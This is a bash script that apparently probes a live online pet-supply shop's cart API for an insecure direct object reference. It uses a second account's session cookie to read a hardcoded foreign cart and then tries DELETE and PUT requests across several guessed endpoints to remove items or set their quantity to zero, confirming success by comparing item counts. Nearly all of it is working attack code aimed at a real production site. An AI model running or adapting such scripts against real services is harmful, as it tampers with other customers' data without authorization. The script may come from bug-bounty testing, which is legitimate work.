#!/bin/bash
# Test IDOR: Modify foreign cart (remove items, change quantity)

CART_UUID="6bd223b4-5040-4faa-ba85-6a85c1ec2d50"
BASE_URL="https://www.zooplus.de"

echo "[*] Testing cart modification endpoints for IDOR..."
echo "[*] Target cart UUID: $CART_UUID"
echo ""

# Need session cookie from Account B
echo "[!] You need to provide Account B session cookie (sid)"
echo "[!] Format: zooplus/6607d90f-fdc2-4387-9b63-1c8feb71250a/d5f7640b-6e48-4364-9fc3-beedf7ca94f2"
read -p "Enter session cookie: " SESSION_COOKIE

if [ -z "$SESSION_COOKIE" ]; then
    echo "[!] No session cookie provided"
    exit 1
fi

echo ""
echo "[*] Step 1: Read cart (baseline)"
curl -s -X GET \
  "$BASE_URL/checkout/api/cart-api/v2/cart/$CART_UUID" \
  -H "Cookie: $SESSION_COOKIE" \
  -H "Accept: application/json" \
  | jq '.articles | length' > /tmp/cart_before.txt

BEFORE_COUNT=$(cat /tmp/cart_before.txt)
echo "[+] Cart has $BEFORE_COUNT items before modification"

echo ""
echo "[*] Step 2: Try to remove an item (if we know article ID)"
# First, get article IDs
ARTICLES=$(curl -s -X GET \
  "$BASE_URL/checkout/api/cart-api/v2/cart/$CART_UUID" \
  -H "Cookie: $SESSION_COOKIE" \
  -H "Accept: application/json" \
  | jq -r '.articles[0].id // empty')

if [ -n "$ARTICLES" ]; then
    echo "[*] Found article ID: $ARTICLES"
    echo "[*] Attempting DELETE on article..."
    
    # Try common endpoints
    for endpoint in \
        "/checkout/api/cart-api/v2/cart/$CART_UUID/articles/$ARTICLES" \
        "/checkout/api/cart-api/v2/cart/$CART_UUID/items/$ARTICLES" \
        "/checkout/api/cart-api/v1/cart/$CART_UUID/articles/$ARTICLES"; do
        
        echo "[*] Trying: $endpoint"
        RESPONSE=$(curl -s -w "\n%{http_code}" -X DELETE \
          "$BASE_URL$endpoint" \
          -H "Cookie: $SESSION_COOKIE" \
          -H "Accept: application/json")
        
        HTTP_CODE=$(echo "$RESPONSE" | tail -1)
        BODY=$(echo "$RESPONSE" | head -n -1)
        
        if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "204" ]; then
            echo "[!!!] SUCCESS: Item deleted! HTTP $HTTP_CODE"
            echo "$BODY" | jq .
            break
        else
            echo "[-] HTTP $HTTP_CODE: $BODY"
        fi
    done
fi

echo ""
echo "[*] Step 3: Try to update quantity"
if [ -n "$ARTICLES" ]; then
    for endpoint in \
        "/checkout/api/cart-api/v2/cart/$CART_UUID/articles/$ARTICLES" \
        "/checkout/api/cart-api/v2/cart/$CART_UUID/items/$ARTICLES" \
        "/checkout/api/cart-api/v1/cart/$CART_UUID/articles/$ARTICLES"; do
        
        echo "[*] Trying PUT: $endpoint (quantity=0)"
        RESPONSE=$(curl -s -w "\n%{http_code}" -X PUT \
          "$BASE_URL$endpoint" \
          -H "Cookie: $SESSION_COOKIE" \
          -H "Content-Type: application/json" \
          -H "Accept: application/json" \
          -d '{"quantity": 0}')
        
        HTTP_CODE=$(echo "$RESPONSE" | tail -1)
        BODY=$(echo "$RESPONSE" | head -n -1)
        
        if [ "$HTTP_CODE" = "200" ]; then
            echo "[!!!] SUCCESS: Quantity updated! HTTP $HTTP_CODE"
            echo "$BODY" | jq .
            break
        else
            echo "[-] HTTP $HTTP_CODE: $BODY"
        fi
    done
fi

echo ""
echo "[*] Step 4: Verify cart after modification"
AFTER_COUNT=$(curl -s -X GET \
  "$BASE_URL/checkout/api/cart-api/v2/cart/$CART_UUID" \
  -H "Cookie: $SESSION_COOKIE" \
  -H "Accept: application/json" \
  | jq '.articles | length')

echo "[+] Cart has $AFTER_COUNT items after modification"

if [ "$BEFORE_COUNT" != "$AFTER_COUNT" ]; then
    echo "[!!!] IDOR CONFIRMED: Cart was modified!"
    echo "[!!!] Before: $BEFORE_COUNT items, After: $AFTER_COUNT items"
else
    echo "[-] Cart count unchanged (modification may have failed or endpoint protected)"
fi

